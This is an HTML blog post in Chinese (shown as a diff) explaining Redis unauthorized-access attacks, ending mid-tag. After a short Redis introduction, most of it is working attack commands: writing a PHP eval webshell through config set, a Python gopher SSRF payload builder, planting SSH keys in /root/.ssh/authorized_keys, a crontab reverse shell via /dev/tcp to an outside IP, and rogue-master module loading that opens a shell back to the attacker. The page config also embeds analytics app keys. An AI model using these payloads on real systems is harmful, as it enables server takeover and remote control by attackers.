@@ -1,0 +1,772 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="什么是Redis Redis（Remote Dictionary Server）是一个开源的内存数据存储系统，它可以用作数据库、缓存和消息中间件。Redis是一个键值存储数据库，其中每个键都映射到一个值，这些值可以是字符串、哈希、列表、集合、有序集合等数据类型。默认运行端口6379 存储特性 123451.以内存作为数据存储介质，读写数据的效率极高。2.储存在 Redis中的数据是持久化的，断电">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis漏洞">
+<meta property="og:url" content="https://fru1ts.github.io/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="什么是Redis Redis（Remote Dictionary Server）是一个开源的内存数据存储系统，它可以用作数据库、缓存和消息中间件。Redis是一个键值存储数据库，其中每个键都映射到一个值，这些值可以是字符串、哈希、列表、集合、有序集合等数据类型。默认运行端口6379 存储特性 123451.以内存作为数据存储介质，读写数据的效率极高。2.储存在 Redis中的数据是持久化的，断电">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fru1ts.github.io/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/1.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/2.jpg">
+<meta property="article:published_time" content="2023-08-04T22:52:21.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:54:39.453Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fru1ts.github.io/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/1.jpg">
+  
+  
+  
+  <title>Redis漏洞 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Redis漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-04 22:52" pubdate>
+          August 4, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Redis漏洞</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="什么是redis"><a class="markdownIt-Anchor" href="#什么是redis"></a> 什么是Redis</h3>
+<p>Redis（Remote Dictionary Server）是一个开源的内存数据存储系统，它可以用作数据库、缓存和消息中间件。Redis是一个键值存储数据库，其中每个键都映射到一个值，这些值可以是字符串、哈希、列表、集合、有序集合等数据类型。默认运行端口<strong>6379</strong></p>
+<p>存储特性</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>.以内存作为数据存储介质，读写数据的效率极高。<br><span class="hljs-number">2</span>.储存在 Redis中的数据是持久化的，断电或重启，数据也不会丢失<br><span class="hljs-number">3</span>.存储分为内存存储、磁盘存储和<span class="hljs-built_in">log</span>文件。<br><span class="hljs-number">4</span>.可以从磁盘重新将数据加载到內存中，也可以通过配置文件对其进行配置，因此，redis才能实现持久化<br><span class="hljs-number">5</span>.支持主从模式，可以配置集群，更利于支撑大型的项目。<br></code></pre></td></tr></table></figure>
+<h3 id="kali安装redis"><a class="markdownIt-Anchor" href="#kali安装redis"></a> Kali安装Redis</h3>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxvf redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.tar.gz<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>/ <br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">make</span> test<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>/src<br><span class="hljs-attribute">cp</span> redis-cli redis-server /usr/bin/<br><span class="hljs-attribute">cp</span> redis.conf /etc<br><span class="hljs-attribute">redis</span>-server #启动服务端<br><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">6379</span> #客户端连接<br><span class="hljs-attribute">config</span> set slave-read-only no <br><span class="hljs-attribute">ps</span> -aux | grep redis  #查看redis启动状态<br></code></pre></td></tr></table></figure>
+<h3 id="redis常用命令"><a class="markdownIt-Anchor" href="#redis常用命令"></a> Redis常用命令</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">info <span class="hljs-comment">#查看信息</span><br>CONFIG GET * <span class="hljs-comment">#获取redis的配置信息</span><br>flushall <span class="hljs-comment">#删除所有数据库内容</span><br>flushdb <span class="hljs-comment">#刷新数据库</span><br>KEYS * <span class="hljs-comment">#查看所有键</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-comment">#设置变量</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> dirpath <span class="hljs-comment">#设置配置项目录的路径</span><br>config get <span class="hljs-built_in">dir</span>/dbfilename <span class="hljs-comment">#获取路径及数据配置信息</span><br>save <span class="hljs-comment">#保存</span><br>get 变量 <span class="hljs-comment">#查看变量名称</span><br>config <span class="hljs-built_in">set</span> requirepass password <span class="hljs-comment">#设置密码</span><br>auth password <span class="hljs-comment">#密码认证</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kongzhongqijing/p/6867960.html">https://www.cnblogs.com/kongzhongqijing/p/6867960.html</a></p>
+<h3 id="redis未授权访问漏洞利用"><a class="markdownIt-Anchor" href="#redis未授权访问漏洞利用"></a> Redis未授权访问漏洞利用</h3>
+<p>有未授权漏洞</p>
+<p>（1）配置登录策略导致任意机器都可以登录redis。<br />
+（2）未设置密码或者设置弱口令。</p>
+<p>无未授权漏洞</p>
+<p>（1）bind 127.0.0.1未注释，仅允许本地访问，攻击机kali无法连接。可尝试本地主从复制rce<br />
+（2）设置了密码，可以用超级弱口令爆破</p>
+<p>Redis 默认情况下，会绑定在 127.0.0.1:6379，但是有时候开发人员为了方便访问，会将其绑定到0.0.0.0，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p>
+<h4 id="redis写webshell"><a class="markdownIt-Anchor" href="#redis写webshell"></a> redis写webshell</h4>
+<p>需要知道web服务的工作目录，需要有写权限</p>
+<p>监听抓包</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i lo -s <span class="hljs-number">0</span> port <span class="hljs-number">6379</span> -w redis.pcap<br></code></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">auth password</span><br><span class="language-xml">config set dir 工作目录</span><br><span class="language-xml">config set dbfilename webshell.php</span><br><span class="language-xml">set -.- &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;  #也可写入一句话木马</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>url = <span class="hljs-string">&quot;http://122.114.254.128:28005&quot;</span>     <span class="hljs-comment">#window上含有ssrf漏洞的页面</span><br>gopher = <span class="hljs-string">&quot;gopher://127.0.0.1:6379/_&quot;</span><br><br><span class="hljs-comment"># 攻击脚本   #一定记着要转义\n</span><br>data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">auth shell</span><br><span class="hljs-string">set test &quot;\\n\\n&lt;?php @eval($_POST[cmd])?&gt;\\n\\n&quot;   </span><br><span class="hljs-string">config set dir /var/www/html/</span><br><span class="hljs-string">config set dbfilename shell.php</span><br><span class="hljs-string">save</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encoder_url</span>(<span class="hljs-params">data</span>):<br>    encoder = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> single_char <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 先转为ASCII</span><br>        encoder += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(single_char)))<br>    encoder = encoder.replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>).replace(<span class="hljs-string">&quot;%a&quot;</span>,<span class="hljs-string">&quot;%0d%0a&quot;</span>)<br>    <span class="hljs-keyword">return</span> encoder<br><br><span class="hljs-comment"># 二次编码</span><br>encoder = url+encoder_url(encoder_url(data))<br><br><span class="hljs-built_in">print</span>(encoder)<br></code></pre></td></tr></table></figure>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wireshark</span> redis.pcap<br></code></pre></td></tr></table></figure>
+<p>追踪TCP流</p>
+<img src="/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/1.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/2.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>复制出payload，url编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&quot;2a310d0a24370d0a434f4d4d414e440d0a2a320d0a24340d0a617574680d0a24340d0a726f6f740d0a2a340d0a24360d0a636f6e6669670d0a24330d0a7365740d0a24330d0a6469720d0a2431340d0a2f7661722f7777772f68746d6c2f0d0a2a340d0a24360d0a636f6e6669670d0a24330d0a7365740d0a2431300d0a646266696c656e616d650d0a2431320d0a7765627368656c6c2e7068700d0a2a330d0a24330d0a7365740d0a24320d0a2d2d0d0a2432360d0a3c3f706870206576616c28245f504f53545b2761275d293b3f3e0d0a2a310d0a24340d0a736176650d0a&quot;</span><br><br>flag=<span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload), <span class="hljs-number">2</span>):<br>   flag+= <span class="hljs-string">&quot;%25&quot;</span> + payload[i:i + <span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure>
+<h4 id="redis写ssh密钥"><a class="markdownIt-Anchor" href="#redis写ssh密钥"></a> redis写ssh密钥</h4>
+<p>版本&lt;redis-4.0.10,必须是linux，root开的redis,ssh端口有开</p>
+<p>利用redis的备份功能，写入ssh公钥</p>
+<p>ssh端口：22</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/ssh start <span class="hljs-comment">#靶机开启ssh服务</span><br>攻击<br>ssh-keygen <span class="hljs-comment">#产生ssh密钥对</span><br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;<span class="hljs-built_in">cat</span> ssh.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; 1.txt <span class="hljs-comment">#将上面生成的公钥保存到1.txt里面</span><br><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 192.168.224.129 -x <span class="hljs-built_in">set</span> crack <span class="hljs-comment">#将生成的公钥文件通过redis上传到目标服务器 ip要替换为目标服务器地址</span><br>redis-cli -h 192.168.224.129 <span class="hljs-comment">#远程连接redis服务</span><br>flushall<br>config get <span class="hljs-built_in">dir</span> <span class="hljs-comment">#获得redis备份的路径</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh <span class="hljs-comment">#更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh,需要存在才能利用） </span><br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys <span class="hljs-comment">#设置上传公钥的备份文件名字为authorized_keys</span><br>config get dbfilename <span class="hljs-comment">#检查是否更改成功（查看有没有authorized_keys文件）</span><br>save<br>ssh -i ssh root@192.168.224.129 <span class="hljs-comment">#攻击机直接ssh连接目标服务器</span><br></code></pre></td></tr></table></figure>
+<h4 id="通过写-crontab-的方式-getshell"><a class="markdownIt-Anchor" href="#通过写-crontab-的方式-getshell"></a> 通过写 crontab 的方式 getshell</h4>
+<p>通过设置定时任务反弹shell（仅限于centos）</p>
+<p>对于Ubuntu需要定时任务的目录权限是600，而由Redis创建的文件权限为644，所以没办法反弹shell；</p>
+<p>而centos对于644权限也能够反弹shell</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h [<span class="hljs-type">Redis</span> <span class="hljs-type">IP</span><span class="hljs-operator">/</span>域名] <span class="hljs-operator">-</span>p <span class="hljs-number">6379</span> #进入交互<br>config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>cron #设置写 crontabs 的文件夹路径<br>config <span class="hljs-keyword">set</span> dbfilename root #修改备份文件名<br><span class="hljs-keyword">set</span> shell <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span> # 写入<span class="hljs-operator">「</span>反弹 shell<span class="hljs-operator">」</span>的计划任务<br>save<br></code></pre></td></tr></table></figure>
+<p>公网服务器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+<h4 id="redis主从复制"><a class="markdownIt-Anchor" href="#redis主从复制"></a> Redis主从复制</h4>
+<ul>
+<li>攻击机Kali：192.168.224.128</li>
+<li>受害机Ubuntu：192.168.224.129</li>
+</ul>
+<h5 id="利用-redis-rogue-server-工具"><a class="markdownIt-Anchor" href="#利用-redis-rogue-server-工具"></a> 利用 redis-rogue-server 工具</h5>
+<ul>
+<li>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+</li>
+<li>
+<p>该工具的原理就是首先创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 <code>slaveof</code> 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，<a target="_blank" rel="noopener" href="http://xn--dbfilenameexp-ro1ue91nifi0l0m9kyb.so">并将dbfilename设置为exp.so</a>。最后再控制Redis从机（slaver）加载模块执行系统命令即可。</p>
+<p>但是该工具无法数据Redis密码进行Redis认证，也就是说该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis<strong>存在密码是不能使用该工具</strong>。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> redis-rogue-server.<span class="hljs-keyword">py</span> --rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">20.135</span> --lhost <span class="hljs-number">192.168</span>.<span class="hljs-number">20.128</span> --<span class="hljs-built_in">exp</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure>
+<p>选择 <code>i</code> 来获得一个交互式的shell，执行在里面执行系统命令即可，也可以选择 <code>r</code> 来获得一个反弹shell。</p>
+</li>
+</ul>
+<h5 id="利用redis-ssrf工具"><a class="markdownIt-Anchor" href="#利用redis-ssrf工具"></a> 利用redis-ssrf工具</h5>
+<p>这个对于Redis存在密码时也可用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>将<code>redis-rogue-server</code>中的<code>exp.io</code>复制到<code>redis-ssrf</code></p>
+<p>修改<code>redis-ssrf</code>中的<code>ssrf-redis.py</code></p>
+<ul>
+<li>将 <code>lhost</code> 改为攻击者vps的ip（47.xxx.xxx.72），用于控制目标Redis服务器连接位于攻击者vps上6666端口上伪造的恶意Redis主机。</li>
+<li>将command修改为要执行的命令</li>
+<li>将第140行的 “127.0.0.1” 改为 “0.0.0.0” ，用于绕过题目对于内网IP的限制。</li>
+<li>最后在第160行填写上Redis的密码 “root”。</li>
+</ul>
+<p>执行ssrf-redis脚本生成payload</p>
+<p>同时运行<code>python2 rogue-server.py</code></p>
+<p>好像说要写个死循环，不然当目标机的Redis连接过来之后，一连上就自动断开连接，可能导致exp.so都没传完就中断了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># do.sh  </span><br><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;1&quot;</span> = <span class="hljs-string">&quot;1&quot;</span> ]  <br><span class="hljs-keyword">do</span>  <br>	python rogue-server.py  <br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p>因为是要ssrf在内网打所以借助gopher协议</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>config set dir <span class="hljs-regexp">/tmp/</span><br>quit<br><br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>config set dbfilename exp.so<br>slaveof <span class="hljs-number">120.77</span>.<span class="hljs-number">205.20</span> <span class="hljs-number">6666</span><br>quit<br><br><span class="hljs-comment">#执行完上面两个</span><br><span class="hljs-comment">#反弹shell</span><br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>module load <span class="hljs-regexp">/tmp/</span>exp.so<br>system.rev <span class="hljs-number">120.77</span>.<span class="hljs-number">205.20</span> <span class="hljs-number">8000</span><br>quit<br><span 